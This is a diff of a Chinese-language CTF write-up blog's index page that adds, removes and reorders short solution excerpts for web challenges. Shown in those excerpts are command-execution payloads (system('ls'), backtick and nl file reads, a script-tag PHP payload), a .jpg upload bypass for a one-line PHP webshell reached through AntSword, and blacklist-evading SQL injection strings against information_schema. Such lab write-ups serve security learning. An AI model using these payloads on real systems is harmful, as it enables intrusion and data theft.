@@ -181,6 +181,53 @@
         
 
 <div class="post">
+    <a href="/2026/01/28/2026-01-28-easycon/">
+        <h2 class="post-title">easycon</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/1/28
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这里初始界面没找到什么有用的信息，加应该index.php发现POST传cmd可以执行命令</p>
+<p><img src="/images/writeups/easycon_e97c5393.png" alt="easycon_e97c5393"></p>
+<p>输入cmd&#x3D;system(‘ls’);</p>
+<p>回显bbbbbbbbb.txt gw.jpg gw2.jpg index.html index.php</p>
+<p>bbbbbbbbb.txt比较可疑</p>
+<p><img src="/images/writeups/easycon_160da602.png" alt="easycon_160da602"></p>
+<p>搜索没有在里面搜到flag结尾有等号，可能是base64解码一下头部有JFIF应该是图片解码成图片得到flag</p>
+<p><img src="/images/writeups/easycon_35309ed5.png" alt="easycon_35309ed5"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+        </span>
+        
+    </div>
+    <a href="/2026/01/28/2026-01-28-easycon/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2026/01/28/2026-01-28-webshell%E6%98%AF%E5%95%A5%E6%8D%8F/">
         <h2 class="post-title">webshell是啥捏</h2>
     </a>
@@ -215,12 +262,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Webshell/" style="color: #03a9f4">Webshell</a>
+            <a href="/tags/Webshell/" style="color: #ffa2c4">Webshell</a>
         </span>
         
     </div>
@@ -228,8 +275,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/01/28/2026-01-28-ez_rce/">
-        <h2 class="post-title">ez_rce</h2>
+    <a href="/2026/01/27/2026-01-27-easyupload1.0/">
+        <h2 class="post-title">easyupload1.0</h2>
     </a>
     <div class="category-and-date">
         
@@ -237,7 +284,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2026/1/28
+            2026/1/27
         </span>
         
         
@@ -245,9 +292,10 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>发现题目没有禁用反引号尝试print_r(<code>l\s /</code>);回显了一个fffffffffflagafag应该就是flag在的地方，这里nl没有被禁用用nl显示flag</p>
-<p>print_r(<code>nl /fffffffffflagafag</code>);成功得到flag</p>
-<p><img src="/images/writeups/ez_rce_3da701c3.png" alt="ez_rce_3da701c3"></p>
+            <p>打开题目发现要上传一个.jpg文件，把一句话木马换成.jpg格式再抓包改回来试试</p>
+<p><img src="/images/writeups/easyupload1.0_d08eefb9.png" alt="easyupload1.0_d08eefb9"></p>
+<p>成功上传，用蚁剑连接，在环境变量中找到flag</p>
+<p><img src="/images/writeups/easyupload1.0_f416dfe2.png" alt="easyupload1.0_f416dfe2"></p>
 
             
         </div>
@@ -262,16 +310,16 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/RCE/" style="color: #ff7d73">RCE</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #00bcd4">文件上传</a>
         </span>
         
     </div>
-    <a href="/2026/01/28/2026-01-28-ez_rce/" class="go-post">阅读全文</a>
+    <a href="/2026/01/27/2026-01-27-easyupload1.0/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -314,59 +362,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
     </div>
     <a href="/2026/01/27/2026-01-27-SIGN-IN/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/01/27/2026-01-27-easyupload1.0/">
-        <h2 class="post-title">easyupload1.0</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/1/27
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>打开题目发现要上传一个.jpg文件，把一句话木马换成.jpg格式再抓包改回来试试</p>
-<p><img src="/images/writeups/easyupload1.0_d08eefb9.png" alt="easyupload1.0_d08eefb9"></p>
-<p>成功上传，用蚁剑连接，在环境变量中找到flag</p>
-<p><img src="/images/writeups/easyupload1.0_f416dfe2.png" alt="easyupload1.0_f416dfe2"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #00a596">文件上传</a>
-        </span>
-        
-    </div>
-    <a href="/2026/01/27/2026-01-27-easyupload1.0/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -404,12 +404,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #00a596">文件上传</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #00bcd4">文件上传</a>
         </span>
         
     </div>
@@ -450,7 +450,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
@@ -494,12 +494,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #03a9f4">文件上传</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="color: #ff7d73">文件上传</a>
         </span>
         
     </div>
@@ -507,8 +507,8 @@
 </div>
 
 <div class="post">
-    <a href="/2026/01/26/2026-01-26-EZ_eval/">
-        <h2 class="post-title">EZ_eval</h2>
+    <a href="/2026/01/26/2026-01-26-babysql/">
+        <h2 class="post-title">babysql</h2>
     </a>
     <div class="category-and-date">
         
@@ -524,15 +524,19 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/images/writeups/EZ_eval_5334e318.png" alt="EZ_eval_5334e318"></p>
-<p>这里发现script没有被禁用,%09代替空格构造payload：</p>
-<p>?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘ls%09&#x2F;‘)</script></p>
-<p>发现flag文件</p>
-<p>尝试?word&#x3D;&lt;script%09language&#x3D;’php’&gt;system(‘c<em>t%09fl</em>g’)</script></p>
-<p>好像不行，这里直接读取文件内容</p>
-<p>&lt;script%09language&#x3D;’php’&gt;system(‘strings%09&#x2F;fl*’)</script></p>
+            <p>注释时题目显示hacker!!black_list is &#x2F;if|and|\s|#|–&#x2F;i</p>
+<p>这里用&#x2F;**&#x2F;代替空格,’闭合前面的’，)闭合前面的(，’闭合后面的’</p>
+<p>查库名</p>
+<p>‘union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;(select&#x2F;**&#x2F;database())’</p>
+<p>查到一个test</p>
+<p>接着查表</p>
+<p>‘&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;(select&#x2F;</strong>&#x2F;group_concat(table_name)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.tables&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_schema&#x3D;’test’)’</p>
+<p>查到flag</p>
+<p>flag中的字段名也叫flag</p>
+<p>查询flag</p>
+<p>‘&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;(select&#x2F;</strong>&#x2F;group_concat(flag)&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;test.flag)’</p>
 <p>得到flag</p>
-<p><img src="/images/writeups/EZ_eval_1939400c.png" alt="EZ_eval_1939400c"></p>
+<p><img src="/images/writeups/babysql_1ac058e4.png" alt="babysql_1ac058e4"></p>
 
             
         </div>
@@ -547,16 +551,16 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/RCE/" style="color: #ff7d73">RCE</a>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #03a9f4">SQL注入</a>
         </span>
         
     </div>
-    <a href="/2026/01/26/2026-01-26-EZ_eval/" class="go-post">阅读全文</a>
+    <a href="/2026/01/26/2026-01-26-babysql/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -638,12 +642,12 @@
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/HTTP%E5%A4%B4/" style="color: #00a596">HTTP头</a>
+            <a href="/tags/HTTP%E5%A4%B4/" style="color: #00bcd4">HTTP头</a>
         </span>
         
     </div>
@@ -684,7 +688,7 @@
         </div>
         <div class="name">youbing</div>
         <div class="description">
-            <p>你好！我是 youbing<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
+            <p>你好！我是 Coder<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
 
         </div>
         
@@ -699,7 +703,7 @@
             </span>
             
             <span class="icon-link">
-                <a target="_blank" rel="noopener" href="https://github.com/youbing3432213764-coder">
+                <a target="_blank" rel="noopener" href="https://github.com/Youbing3432213764-coder">
                     <i
                         class="fa-brands fa-github fa-fw"
                     ></i>
